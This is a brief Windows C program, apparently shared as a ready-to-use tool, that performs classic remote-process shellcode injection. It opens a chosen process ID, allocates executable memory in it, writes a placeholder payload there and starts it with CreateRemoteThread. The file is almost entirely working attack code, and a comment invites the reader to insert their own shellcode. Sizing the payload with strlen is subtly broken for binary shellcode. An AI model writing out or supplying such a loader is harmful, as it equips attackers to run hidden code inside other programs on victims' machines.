#include <Windows.h>
#include <tchar.h>

void main()
{
    const char* payload = ""; // place shellcode here , also check out the orginal code :D

    BYTE* shellcode = (BYTE*)payload;
  
    DWORD pid = 4800; // Change this to the PID you want to inject into
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL)
    {
        _tprintf(_T("Failed to open the target process. Error %lu\n"), GetLastError());
        return;
    }

    LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, NULL, strlen(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpRemoteBuffer == NULL)
    {
        _tprintf(_T("Failed to allocate memory in the target process. Error %lu\n"), GetLastError());
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, lpRemoteBuffer, shellcode, strlen(payload), NULL))
    {
        _tprintf(_T("Failed to write shellcode to the target process. Error %lu\n"), GetLastError());
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL)
    {
        _tprintf(_T("Failed to create a remote thread. Error %lu\n"), GetLastError());
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}
